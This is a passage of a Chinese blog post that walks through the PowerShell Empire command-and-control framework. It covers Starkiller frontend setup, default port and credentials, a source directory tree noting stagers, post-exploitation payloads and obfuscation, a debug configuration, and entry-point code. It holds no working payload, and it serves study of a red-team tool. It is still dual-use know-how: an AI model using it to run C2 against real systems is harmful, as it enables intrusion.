<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># 确认一下</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">agents</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><blockquote><p><img src="http://cdn.ayusummer233.top/DailyNotes/202305282319434.png" alt="image-20230528231930403"></p></blockquote><hr><h2 id="starkiller" tabindex="-1"><a class="header-anchor" href="#starkiller"><span>Starkiller</span></a></h2><blockquote><p><a href="https://github.com/BC-SECURITY/Starkiller" target="_blank" rel="noopener noreferrer">BC-SECURITY/Starkiller: Starkiller is a Frontend for PowerShell Empire. --- BC-SECURITY/Starkiller：Starkiller 是 PowerShell Empire 的前端。 (github.com)</a></p></blockquote><p>从 Empire 5.0 以及 Starkiller 2.0 开始, 无需手动拉取 Starkiller 仓库来构建, Starkiller 已经作为子模块打包在了 Empire 中并通过 Empire 的 API 提供服务</p><p>通过 Github 源码安装了 Empire 5.0+ 之后可以在 <code>empire/server/api/v2/starkiller</code> 看到 Starkiller 的源码:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309061624498.png" alt="image-20230906162414414"></p><hr><p>默认挂在了 1337 端口</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309061601806.png" alt="image-20230906160140011"></p><p>可以通过 <code>restport</code> 参数来指定</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309061606193.png" alt="image-20230906160640133"></p><p>访问 <code>1337/index.html</code> 即可看到登录页:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309061618580.png" alt="image-20230906161813449"></p><p>默认账密在 <code>config.yaml</code> 中有定义:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309061618685.png" alt="image-20230906161855631"></p><p>不在 empire 本机打开网页的话需要把 URL 中的 localhost 改成 empire 机子的 ip</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309061628667.png" alt="image-20230906162822599"></p><p>成功登入后会显示 listeners 界面:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309061647138.png" alt="image-20230906164730064"></p><blockquote><p>可以通过点击头像并点击 <code>&gt;|</code> 来固定左侧边栏:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309061648109.png" alt="image-20230906164823009"></p></blockquote><hr><p>可以在 Users 界面设置用户的管理员权限以及是否启用</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309081709825.png" alt="image-20230908170913223"></p><hr><p>在 <code>Settings</code> 页面可以修改当前用户的密码, 以及<code>登出</code> :</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309081710120.png" alt="image-20230908171009047"></p><hr><p><mark>需要注意的是</mark>, 在修改了密码或是禁用了 <code>empireadmin</code> 账户后需要相应修改配置文件中的默认账密, 否则可能会导致 server 或者 client 默认使用默认配置而起不来</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309081715037.png" alt="image-20230908171539888"></p><hr><h2 id="整体源码概述" tabindex="-1"><a class="header-anchor" href="#整体源码概述"><span>整体源码概述</span></a></h2><blockquote><p><a href="https://tttang.com/archive/1281/" target="_blank" rel="noopener noreferrer">Empire 源码分析(一) - 跳跳糖 (tttang.com)</a> -- 19 年的博客, 应该是旧版的源码目录分析, 这里作为参考, 可能是检索方法的原因, 也可能是真没有相关资源, 总之并没有检索出什么 Powershell Empire 源码分析的文章</p></blockquote><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># 可以在项目根目录下使用 tree 命令以及 -L 参数来指定层级生成项目结构树</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">tree</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -L</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 3</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> &gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">tree.md</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div><p>然后手动精简一下:</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>.</span></span>
<span class="line"><span>├── changelog</span></span>
<span class="line"><span>├── CHANGELOG.md</span></span>
<span class="line"><span>├── conftest.py</span></span>
<span class="line"><span>├── Dockerfile</span></span>
<span class="line"><span>├── docs</span></span>
<span class="line"><span>│   ├── ...各类帮助文档</span></span>
<span class="line"><span>├── empire</span></span>
<span class="line"><span>│   ├── arguments.py</span></span>
<span class="line"><span>│   ├── client</span></span>
<span class="line"><span>│   │   ├── client.py</span></span>
<span class="line"><span>│   │   ├── config.yaml</span></span>
<span class="line"><span>│   │   ├── downloads</span></span>
<span class="line"><span>│   │   ├── generated-stagers</span></span>
<span class="line"><span>│   │   ├── __init__.py</span></span>
<span class="line"><span>│   │   └── src</span></span>
<span class="line"><span>│   ├── __init__.py</span></span>
<span class="line"><span>│   ├── scripts</span></span>
<span class="line"><span>│   │   └── sync_starkiller.py</span></span>
<span class="line"><span>│   ├── server</span></span>
<span class="line"><span>│   │   ├── api</span></span>
<span class="line"><span>│   │   ├── bypasses</span></span>
<span class="line"><span>│   │   ├── common</span></span>
<span class="line"><span>│   │   ├── config.yaml</span></span>
<span class="line"><span>│   │   ├── core</span></span>
<span class="line"><span>│   │   ├── csharp</span></span>
<span class="line"><span>│   │   ├── data</span></span>
<span class="line"><span>│   │   │   ├── agent</span></span>
<span class="line"><span>│   │   │   ├── __init__.py</span></span>
<span class="line"><span>│   │   │   ├── Invoke-Obfuscation    用于混淆 Powershell命令</span></span>
<span class="line"><span>│   │   │   ├── listeners</span></span>
<span class="line"><span>│   │   │   ├── misc</span></span>
<span class="line"><span>│   │   │   ├── module_source</span></span>
<span class="line"><span>│   │   │   ├── obfuscated_module_source</span></span>
<span class="line"><span>│   │   │   └── profiles</span></span>
<span class="line"><span>│   │   ├── downloads</span></span>
<span class="line"><span>│   │   ├── __init__.py</span></span>
<span class="line"><span>│   │   ├── listeners    各类listener</span></span>
<span class="line"><span>│   │   ├── modules      各类后渗透阶段的payload</span></span>
<span class="line"><span>│   │   ├── plugins		 插件示例</span></span>
<span class="line"><span>│   │   ├── server.py</span></span>
<span class="line"><span>│   │   ├── stagers      各类平台下的stager脚本</span></span>
<span class="line"><span>│   │   └── utils</span></span>
<span class="line"><span>│   └── test</span></span>
<span class="line"><span>│       ├── ... 各类测试</span></span>
<span class="line"><span>├── empire.py    主程序入口</span></span>
<span class="line"><span>├── LICENSE</span></span>
<span class="line"><span>├── poetry.lock</span></span>
<span class="line"><span>├── ps-empire</span></span>
<span class="line"><span>├── pyproject.toml</span></span>
<span class="line"><span>├── pytest.ini</span></span>
<span class="line"><span>├── README.md</span></span>
<span class="line"><span>├── setup</span></span>
<span class="line"><span>│   ├── cert.sh</span></span>
<span class="line"><span>│   ├── checkout-latest-tag.sh</span></span>
<span class="line"><span>│   └── install.sh</span></span>
<span class="line"><span>└── tree.md - 刚才生成的项目树结构的文件</span></span>
<span class="line"><span></span></span>
<span class="line"><span>36 directories, 87 files</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><blockquote><p>暂时还没看到的目录便还没标注含义</p></blockquote><hr><h3 id="调试" tabindex="-1"><a class="header-anchor" href="#调试"><span>调试</span></a></h3><p>可以使用 VSCode 配置 <code>launch.json</code> 来调试 Empire</p><div class="language-json line-numbers-mode" data-highlighter="shiki" data-ext="json" data-title="json" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">{</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">  &quot;version&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;0.2.0&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">  &quot;configurations&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">: [</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    {</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">      &quot;name&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;Powershell Empire Server&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">      &quot;type&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;python&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">      &quot;request&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;launch&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">      &quot;program&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;${workspaceFolder}/empire.py&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">// Empire 入口程序</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">      &quot;python&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;${workspaceFolder}/.venv/bin/python&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">// Poetry 虚拟环境中的 Python 解释器路径</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">      &quot;args&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">: [</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;server&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">],</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">      &quot;cwd&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;${workspaceFolder}&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">      &quot;console&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;integratedTerminal&quot;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    }</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">  ]</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">}</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>然后可以在主程序上打断点来做调试</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309111102431.png" alt="image-20230911110231233"></p><hr><h3 id="主程序入口" tabindex="-1"><a class="header-anchor" href="#主程序入口"><span>主程序入口</span></a></h3><p><code>empire.py</code>:</p><div class="language-python line-numbers-mode" data-highlighter="shiki" data-ext="python" data-title="python" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#! /usr/bin/env python3</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">import</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> sys</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">import</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> empire.arguments </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">as</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> arguments</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">if</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;"> __name__</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> ==</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;__main__&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">:</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    args </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> arguments.args</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">    if</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> args.subparser_name </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">==</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;server&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">:</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">        import</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> empire.server.server </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">as</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> server</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">        server.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF;">run</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(args)</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">    elif</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> args.subparser_name </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">==</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;sync-starkiller&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">:</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">        import</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> yaml</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">        from</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> empire.scripts.sync_starkiller </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">import</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> sync_starkiller</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">        with</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;"> open</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;empire/server/config.yaml&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">) </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">as</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> f:</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">            config </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> yaml.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF;">safe_load</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(f)</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF;">        sync_starkiller</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(config)</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">    elif</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> args.subparser_name </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">==</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;client&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">:</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">        import</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> empire.client.client </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">as</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> client</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">        client.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF;">start</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(args)</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    sys.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF;">exit</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>起 Powershell empire</p><p>这里看下 server: <code>empire/server/server.py</code> 的 <code>run</code> 函数</p><div class="language-python line-numbers-mode" data-highlighter="shiki" data-ext="python" data-title="python" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">def</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;"> run</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#986801;--shiki-light-font-style:inherit;--shiki-dark:#D19A66;--shiki-dark-font-style:italic;">args</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">):</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF;">    setup_logging</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(args)</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF;">    check_submodules</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">()</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF;">    check_recommended_configuration</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">()</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">    if</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;"> not</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> args.restport:</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">        args.restport </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 1337</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">    else</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">:</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">        args.restport </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;"> int</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(args.restport[</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">])</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">    if</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;"> not</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> args.restip:</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">        args.restip </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;0.0.0.0&quot;</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">    else</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">:</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">        args.restip </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> args.restip[</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">]</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">    if</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> args.version:</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">        # log to stdout instead of stderr</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">        print</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(empire.</span><span style="--shiki-light:#383A42;--shiki-dark:#D19A66;">VERSION</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">        sys.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF;">exit</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">()</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">    elif</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> args.reset:</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">        choice </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;"> input</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">            &quot;</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\x1b</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">[1;33m[&gt;] Would you like to reset your Empire Server instance? [y/N]: </span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\x1b</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">[0m&quot;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">        )</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">        if</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> choice.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF;">lower</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">() </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">==</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;y&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">:</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF;">            reset</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">()</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">        sys.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF;">exit</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">()</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">    else</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">:</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">        base.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF;">startup_db</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">()</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">        global</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> main</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">        # Calling run more than once, such as in the test suite</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">        # Will generate more instances of MainMenu, which then</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">        # causes shutdown failure.</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">        if</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> main </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">is</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> None</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">:</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">            main </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> empire.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF;">MainMenu</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#986801;--shiki-light-font-style:inherit;--shiki-dark:#E06C75;--shiki-dark-font-style:italic;">args</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">args)</span></span>
<span class="line"></span>
